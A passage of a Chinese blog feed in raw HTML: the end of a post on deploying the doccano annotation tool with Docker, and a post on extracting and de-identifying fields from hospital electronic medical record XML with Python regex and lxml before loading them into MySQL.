chakkiworks&#x2F;doccano # 运行镜像，请按需修改端口$ docker exec doccano tools&#x2F;create-admin.sh &quot;admin&quot; &quot;[email protected]&quot; &quot;password&quot; # 创建用户并指定密码<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>注意 Docker镜像run之后会产生三个容器，doccona_nginx、doccona_backend、docker_frontend,其中docker_frontend在构建完成后会直接exit，这是一个feature，不是bug，它的主要作用是webpack打包</p><figure><img src="/9112/image-20200109220759931.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure></blockquote><h4 id="访问docker中的postgresql数据库中的数据">访问Docker中的PostgreSQL数据库中的数据</h4><p>由于数据库安全问题，数据库分离再一个单独的容器中并且 首先执行<code>Docker exec</code>命令进入相应的PostgreSQL数据库容器</p><p>应该看到下图这样，终端从宿主机切换进容器</p><figure><img src="/9112/image-20200109220232851.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>在容器的shell中用命令进入数据库</p><pre class="line-numbers language-none"><code class="language-none">$ psql -h 127.0.0.1 -d doccano -U doccano -p 5432 # 注意你的host，数据库名、用户名和端口<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>应该看到下图这样，终端从Docker容器切进数据库</p><figure><img src="/9112/image-20200109220100751.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>然后执行<code>\l</code>等命令进入和查看数据库（执行SQL）</p><h4 id="使用">使用</h4><p>后台管理入口是这个http://yoursite/admin/，就是一个Django自带的后台管理</p><figure><img src="/9112/image-20200411204841203-1586654887394.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><figure><img src="/9112/image-20200411205005107-1586654884937.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><figure><img src="/9112/image-20200411205102588-1586654882966.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>登录进去后可自行添加账号和项目并设置权限和标签，标注项目选择sequential labeing即可，导出时选择JSONL格式</p><p>这个数据比较多的时候没有自动跳转比较麻烦，请直接在浏览器地址栏使用url跳转</p><p>比如，修改浏览器后面的url，#后面的offset改为685，直接回车，就可以从当前的689跳转到第685个数据</p><p>http://yoursite/projects/6/#offset=685</p><figure><img src="/9112/image-20200307213544539.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><h2 id="注">注</h2><p>https://github.com/doccano/doccano 一个开源的标注工具</p><p>https://github.com/macanv/BERT-BiLSTM-CRF-NER 一个BERT的NER工具包</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;BERT效果确实好，就是有点吃内存&lt;/p&gt;</summary>
    
    
    
    <category term="102网吧日常" scheme="https://zhangjk98.xyz/categories/102%E7%BD%91%E5%90%A7%E6%97%A5%E5%B8%B8/"/>
    
    
    <category term="bert" scheme="https://zhangjk98.xyz/tags/bert/"/>
    
    <category term="NER" scheme="https://zhangjk98.xyz/tags/NER/"/>
    
  </entry>
  
  <entry>
    <title>处理电子病历</title>
    <link href="https://zhangjk98.xyz/81d4/"/>
    <id>https://zhangjk98.xyz/81d4/</id>
    <published>2020-04-23T09:02:18.000Z</published>
    <updated>2020-04-23T09:02:18.000Z</updated>
    
    <content type="html"><![CDATA[<p>有两种鬼画符，一种是医生的字，一种是正则表达式 <a id="more"></a> 周某出狱了，而我也开始打工了，咳咳</p><p>最近开始折腾电子病历之类的东西，有几家医院的原始数据，几乎都是xml之类的（都是接口导出的，反正从医院要不到数据库里面的原始数据），不同医院数据格式和医生书写风格差的还挺大。</p><p><em>下面这些基本都是用的python的库</em></p><h2 id="解析和提取内容">解析和提取内容</h2><h3 id="脱敏">脱敏</h3><p>先脱敏，大概的姓名身份证号住址啥的都挑出来抹掉，一般拿正则表达式替换一下就行了</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> rep1 <span class="token operator">=</span> <span class="token string">r'&lt;姓名.*?>.*?&lt;/姓名>'</span>p2 <span class="token operator">=</span> <span class="token string">r'&lt;姓名>小明&lt;/姓名>'</span>newtext <span class="token operator">=</span> re<span class="token punctuation">.</span>sub<span class="token punctuation">(</span>p1<span class="token punctuation">,</span> p2<span class="token punctuation">,</span> text<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="提出内层html">提出内层html</h3><p>xml里面嵌套了一层html（还是html4.0），html里面又嵌套了几段xml</p><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="utf-8"?></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">soap:</span>Envelope</span> <span class="token attr-name"><span class="token namespace">xmlns:</span>soap</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://schemas.xmlsoap.org/soap/envelope/<span class="token punctuation">"</span></span> <span class="token attr-name"><span class="token namespace">xmlns:</span>xsi</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.w3.org/2001/XMLSchema-instance<span class="token punctuation">"</span></span> <span class="token attr-name"><span class="token namespace">xmlns:</span>xsd</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.w3.org/2001/XMLSchema<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">soap:</span>Body</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>getHospitalInfoResponse</span> <span class="token attr-name">xmlns</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://tempuri.org/<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>getHospitalInfoResult</span><span class="token punctuation">></span></span>true<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>getHospitalInfoResult</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>HTML</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&lt;">&amp;lt;</span>!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN"<span class="token entity named-entity" title="&gt;">&amp;gt;</span><span class="token entity named-entity" title="&lt;">&amp;lt;</span>HTML<span class="token entity named-entity" title="&gt;">&amp;gt;</span><span class="token entity named-entity" title="&lt;">&amp;lt;</span>            HEAD<span class="token entity named-entity" title="&gt;">&amp;gt;</span><span class="token entity named-entity" title="&lt;">&amp;lt;</span>TITLE<span class="token entity named-entity" title="&gt;">&amp;gt;</span>Demo For Lord<span class="token entity named-entity" title="&lt;">&amp;lt;</span>/TITLE<span class="token entity named-entity" title="&gt;">&amp;gt;</span><span class="token entity named-entity" title="&lt;">&amp;lt;</span>META http-equiv=Content-Type             content="text/html; charset=unicode"<span class="token entity named-entity" title="&gt;">&amp;gt;</span><span class="token entity named-entity" title="&lt;">&amp;lt;</span>META content="MSHTML 6.00.2900.6182"            中间太长略去            多重耐药菌防控措施处置表 (42)出科病历评分表 (43)病历排序<span class="token entity named-entity" title="&lt;">&amp;lt;</span>/FONT<span class="token entity named-entity" title="&gt;">&amp;gt;</span><span class="token entity named-entity" title="&lt;">&amp;lt;</span>/P<span class="token entity named-entity" title="&gt;">&amp;gt;</span><span class="token entity named-entity" title="&lt;">&amp;lt;</span>P<span class="token entity named-entity" title="&gt;">&amp;gt;</span><span class="token entity named-entity" title="&amp;">&amp;amp;</span>nbsp;<span class="token entity named-entity" title="&lt;">&amp;lt;</span>/P<span class="token entity named-entity" title="&gt;">&amp;gt;</span><span class="token entity named-entity" title="&lt;">&amp;lt;</span>/BODY<span class="token entity named-entity" title="&gt;">&amp;gt;</span><span class="token entity named-entity" title="&lt;">&amp;lt;</span>/HTML<span class="token entity named-entity" title="&gt;">&amp;gt;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>HTML</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>errorMsg</span><span class="token punctuation">></span></span>string<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>errorMsg</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>getHospitalInfoResponse</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span><span class="token namespace">soap:</span>Body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span><span class="token namespace">soap:</span>Envelope</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>除了最外层的xml，其他的标签都被转码了。</p><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml">@<span class="token entity named-entity" title="&amp;">&amp;amp;</span>lt;/FONT<span class="token entity named-entity" title="&amp;">&amp;amp;</span>gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>先把<code>&amp;amp;</code>转码回<code>&amp;</code>，再把<code>&amp;lt;</code>转为<code>&lt;</code>，<code>&amp;gt;</code>转回<code>&gt;</code></p><p>转完之后会变成熟悉的标签</p><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml">@<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>FONT</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后删掉空格之类的<code>&amp;nbsp;</code>以及<code>&amp;amp;nbsp;</code></p><p>规整的数据，比如一些用标签区分出来的数据，解析一下XML或者用直接用正则表达式提出来</p><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>FONT</span> <span class="token attr-name">color</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>#000000</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>STRONG</span><span class="token punctuation">></span></span>主诉:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>STRONG</span><span class="token punctuation">></span></span>颈部不适伴头痛、头晕2周，加重1周。<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>FONT</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python">chief_compliant <span class="token operator">=</span> <span class="token string">r'(?&lt;=&lt;STRONG>主诉:&lt;/STRONG>).*?(?=&lt;/FONT>)|(?&lt;=&lt;STRONG>主诉：&lt;/STRONG>).*?(?=&lt;/FONT>)'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="病案号等xml中的内容">病案号等xml中的内容</h3><p>病案号之类的可以用正则直接抽</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">medical_record_number <span class="token operator">=</span> <span class="token string">r'&lt;病案号.*?>.*?&lt;/病案号>'</span>medical_record_number_temp <span class="token operator">=</span> regex<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>medical_record_number<span class="token punctuation">,</span> htmlhandle<span class="token punctuation">)</span><span class="token keyword">if</span> medical_record_number_temp<span class="token punctuation">:</span>    modified_number <span class="token operator">=</span> <span class="token string">r'\d&#123;6&#125;(?=&lt;/病案号>)'</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"病案号："</span><span class="token punctuation">,</span> regex<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>modified_number<span class="token punctuation">,</span> medical_record_number_temp<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"病案号："</span><span class="token punctuation">,</span> <span class="token string">"Null"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="html部分">html部分</h3><p>要完整的把html中所有的字段都分析一下然后重新存到数据库里面，正则表达式就麻烦起来了，还是直接用xml库解析一下xml比较好，比如Xpath和Beautifulsoup之类的（这里建议数据量大、操作多的直接上lxml和regex、re2之类的，不用Beautifulsoup和re这两个库）</p><p>先用utf-8编码读取</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>path<span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> xmlread<span class="token punctuation">:</span>    xmltext <span class="token operator">=</span> xmlread<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>用lxml直接解析的时候会出报错，因为lxml不认unicode之类的，我们给他转成byte</p><pre class="line-numbers language-log" data-language="log"><code class="language-log">ValueError: Unicode strings with encoding declaration are not supported. Please use bytes input or XML fragments without declaration.<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>加一句</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">myxml_b <span class="token operator">=</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token builtin">bytearray</span><span class="token punctuation">(</span>xmltext<span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后用lxml解析就好了</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">myxml <span class="token operator">=</span> etree<span class="token punctuation">.</span>XML<span class="token punctuation">(</span>myxml_b<span class="token punctuation">)</span>result <span class="token operator">=</span> etree<span class="token punctuation">.</span>tostring<span class="token punctuation">(</span>myxml<span class="token punctuation">,</span>pretty_print <span class="token operator">=</span> <span class="token boolean">True</span><span class="token punctuation">,</span>encoding <span class="token operator">=</span> <span class="token string">"utf-8"</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>要提取的主要信息都在html部分里面，外层的xml里面没啥东西，我们直接把外层的xml扔了，解析里面的html</p><p>另存为html就可以在浏览器里看到了，使用F12调试工具可以直接抓取html里面元素的xpath</p><figure><img src="/81d4/image-20200426094024186.png" alt="病历" /><figcaption aria-hidden="true">病历</figcaption></figure><p>但是仔细一看发现这个病历的html标签每份不太一样，比如有的第10对p标签里面是主诉的东西，但是另一份病历第10对p标签里面是住院病人离院责任书。没有固定的标志位，不太好提，不如直接上正则。</p><p>多看了几份病历发现小问题很多，格式一点也规整，比如主诉，不同病历有下面这几种</p><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>FONT</span> <span class="token attr-name">color</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>#000000</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>STRONG</span><span class="token punctuation">></span></span>主诉:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>STRONG</span><span class="token punctuation">></span></span>颈部不适伴头痛、头晕2周，加重1周。<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>FONT</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>FONT</span> <span class="token attr-name">color</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>#000</span><span class="token punctuation">></span></span>主诉:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>FONT</span> <span class="token attr-name">color</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>#ff0000</span><span class="token punctuation">></span></span>反复咳嗽、<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>FONT</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>FONT</span> <span class="token attr-name">color</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>#4682b4</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>FONT</span> <span class="token attr-name">color</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>#ff0000</span><span class="token punctuation">></span></span>心累、气紧6年，<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>FONT</span><span class="token punctuation">></span></span>双下肢水肿4年，加重12天<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>FONT</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>FONT</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>STRONG</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>FONT</span><span class="token attr-name">&lt;P</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>FONT</span> <span class="token attr-name">color</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>steelblue</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>STRONG</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>FONT</span> <span class="token attr-name">color</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>#000</span><span class="token punctuation">></span></span>主诉<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>FONT</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>STRONG</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>FONT</span><span class="token punctuation">></span></span>:发现血压升高30+年，反复头晕4+月，加重1天<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>P</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>有的连冒号都被颜色标签截断了，最后索性用正则直接拉取含有主诉的p标签内的整段</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 主诉（re方法）</span><span class="token comment"># chief_compliant = r'(?&lt;=&lt;STRONG>主诉.*?&lt;/STRONG>).*?(?=&lt;/FONT>)|(?&lt;=&lt;STRONG>主诉：&lt;/STRONG>).*?(?=&lt;/FONT>)'</span>chief_compliant <span class="token operator">=</span> <span class="token string">r'&lt;P>&lt;FONT color=steelblue>.*?主诉.*?&lt;/P>'</span>chief <span class="token operator">=</span> regex<span class="token punctuation">.</span>search<span class="token punctuation">(</span>chief_compliant<span class="token punctuation">,</span> myhtml<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><figure><img src="/81d4/image-20200426220846518.png" alt="image-20200426220846518" /><figcaption aria-hidden="true">image-20200426220846518</figcaption></figure><p>输出的结果再把标签、主诉二字和冒号等删去</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pyquery <span class="token keyword">import</span> PyQuerychief_text <span class="token operator">=</span> PyQuery<span class="token punctuation">(</span>chief<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">if</span> chief_text<span class="token punctuation">.</span>text<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># clean the chief compliant text</span>    p1 <span class="token operator">=</span> <span class="token string">r'主诉|\n|:|：'</span>    chief_clean <span class="token operator">=</span> regex<span class="token punctuation">.</span>sub<span class="token punctuation">(</span>p1<span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>chief_text<span class="token punctuation">.</span>text<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    text<span class="token punctuation">.</span>append<span class="token punctuation">(</span>chief_clean<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>差不多能看了</p><figure><img src="/81d4/image-20200426220726567.png" alt="image-20200426220726567" /><figcaption aria-hidden="true">image-20200426220726567</figcaption></figure><p>再用同样的方法提现病史的时候遇到了问题，发现正则会把之前主诉的内容也匹配上，这是python正则的懒惰匹配只能向后没有向前。一个办法是抽出来然后删掉主诉</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 现病史（re方法）</span>phpi <span class="token operator">=</span> <span class="token string">r'&lt;P>&lt;FONT color=steelblue>.*?现病史.*?&lt;/P>'</span>hpi <span class="token operator">=</span> regex<span class="token punctuation">.</span>search<span class="token punctuation">(</span>phpi<span class="token punctuation">,</span> myhtml<span class="token punctuation">)</span><span class="token keyword">if</span> hpi<span class="token punctuation">:</span>    <span class="token comment"># remove_tag = r'&lt;[^>]+>'</span>    <span class="token comment"># hpi_no_tag = regex.sub(remove_tag,'', hpi[0])</span>    <span class="token comment"># if hpi_no_tag:</span>    <span class="token comment">#     hpi_no_title_tag = regex.sub(r'主诉','',hpi_no_tag[0])</span>    <span class="token comment">#     if hpi_no_title_tag:</span>    <span class="token comment">#         text.append(hpi_no_title_tag[0])</span>    <span class="token keyword">from</span> pyquery <span class="token keyword">import</span> PyQuery    hpi_text <span class="token operator">=</span> PyQuery<span class="token punctuation">(</span>hpi<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> hpi_text<span class="token punctuation">.</span>text<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment"># clean the hpi compliant text</span>        p1 <span class="token operator">=</span> <span class="token string">r'\n|:|：'</span>        hpi_clean <span class="token operator">=</span> regex<span class="token punctuation">.</span>sub<span class="token punctuation">(</span>p1<span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>hpi_text<span class="token punctuation">.</span>text<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        hpi_cut <span class="token operator">=</span> regex<span class="token punctuation">.</span>sub<span class="token punctuation">(</span><span class="token string">'.*?(?=现病史)'</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span>hpi_clean<span class="token punctuation">)</span>        hpi_end <span class="token operator">=</span> regex<span class="token punctuation">.</span>sub<span class="token punctuation">(</span><span class="token string">'现病史'</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span>hpi_cut<span class="token punctuation">)</span>        text<span class="token punctuation">.</span>append<span class="token punctuation">(</span>hpi_end<span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    text<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">'Null'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>后面5个病史都这样正则匹配很浪费时间，索性把这一大段全抽出来，直接全部去格式变为纯文本</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">主诉颈部不适伴头痛、头晕2周，加重1周。现病史2周前患者因长期伏案工作后出现颈部不适伴头痛、头晕，转颈时头晕、头痛加重，休息后症状有所减轻，无伴双上肢放射痛及麻木感，无耳鸣，无视物旋转，无恶心呕吐，无踩棉花感，疼痛与天气变化无关，遂至“都江堰医院”就诊，检查头颅MRI未提示异常。近1周来，患者头晕、头痛加重，为求进一步系统治疗，遂入我科，门诊以“颈椎病”收入住院。入院症见步入病房，神清，精神可，颈部不适伴头痛、头晕，转颈时头晕、头痛加重，休息后症状有所减轻，无伴双上肢放射痛及麻木感，无耳鸣，无视物旋转，无恶心呕吐，无踩棉花感，纳眠可，二便调。既往史否认“糖尿病”、“高血压病”、“冠心病”等慢性病病史，否认“乙肝”、“结核”等传染病病史，否认重大手术史及外伤史。否认药物过敏史及食物过敏史，预防接种史不详。个人史生于四川阿坝长期居住于当地，否认疫区居住史，否认冶游史，否认吸烟、嗜酒等不良嗜好。月经及婚育史，患者自诉近期月经周期紊乱及月经量减少；适龄婚育，育有1女，家人均体健。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后根据主诉、现病史、既往史拆分每一部分</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 拉取现病史</span>hpi <span class="token operator">=</span> regex<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">r'(?&lt;=现病史).*?(?=既往史)'</span>chiefandhistory_clean<span class="token punctuation">)</span><span class="token keyword">if</span> hpi<span class="token punctuation">:</span>    text<span class="token punctuation">.</span>append<span class="token punctuation">(</span>hpi<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    text<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">'Null'</span><span class="token punctuation">)</span><span class="token comment"># 拉取既往史</span>item <span class="token operator">=</span> regex<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">r'(?&lt;=既往史).*?(?=个人史)'</span>chiefandhistory_clean<span class="token punctuation">)</span><span class="token keyword">if</span> item<span class="token punctuation">:</span>    text<span class="token punctuation">.</span>append<span class="token punctuation">(</span>item<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    text<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">'Null'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="批量读写文件">批量读写文件</h3><p>差不多能读了就把所有的病历批处理一下，这里用os.walk遍历所有xml文件（文件名是HIS标识+xml，不连续，就直接批量拉取了）</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># dir = "./Data1"</span><span class="token comment">#使用listdir循环遍历</span><span class="token keyword">def</span> <span class="token function">getxml</span><span class="token punctuation">(</span><span class="token builtin">dir</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">import</span> os    path <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>isdir<span class="token punctuation">(</span><span class="token builtin">dir</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">dir</span><span class="token punctuation">)</span>        path <span class="token operator">=</span> <span class="token builtin">dir</span>    dirlist <span class="token operator">=</span> os<span class="token punctuation">.</span>walk<span class="token punctuation">(</span><span class="token builtin">dir</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> root<span class="token punctuation">,</span> dirs<span class="token punctuation">,</span> files <span class="token keyword">in</span> dirlist<span class="token punctuation">:</span>        <span class="token keyword">for</span> <span class="token builtin">file</span> <span class="token keyword">in</span> files<span class="token punctuation">:</span>            <span class="token keyword">if</span> <span class="token builtin">file</span><span class="token punctuation">.</span>endswith<span class="token punctuation">(</span><span class="token string">".xml"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                path<span class="token punctuation">.</span>append<span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>root<span class="token punctuation">,</span> <span class="token builtin">file</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"./XMLfilename.txt"</span><span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>        <span class="token keyword">for</span> line <span class="token keyword">in</span> path<span class="token punctuation">:</span>            f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>line<span class="token punctuation">)</span>            f<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> path<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="写入数据库">写入数据库</h2><p>最后是入库操作，这里为了省事直接用PyMySQL了</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> pymysqlconnection <span class="token operator">=</span> pymysql<span class="token punctuation">.</span>connect<span class="token punctuation">(</span>host<span class="token operator">=</span>workstation_host<span class="token punctuation">,</span>                             port<span class="token operator">=</span>workstation_port<span class="token punctuation">,</span>                             user<span class="token operator">=</span><span class="token string">'root'</span><span class="token punctuation">,</span>                             password<span class="token operator">=</span>workstation_passwd<span class="token punctuation">,</span>                             db<span class="token operator">=</span><span class="token string">'EMR'</span><span class="token punctuation">,</span>                             charset<span class="token operator">=</span><span class="token string">'utf8'</span><span class="token punctuation">)</span>cursor <span class="token operator">=</span> connection<span class="token 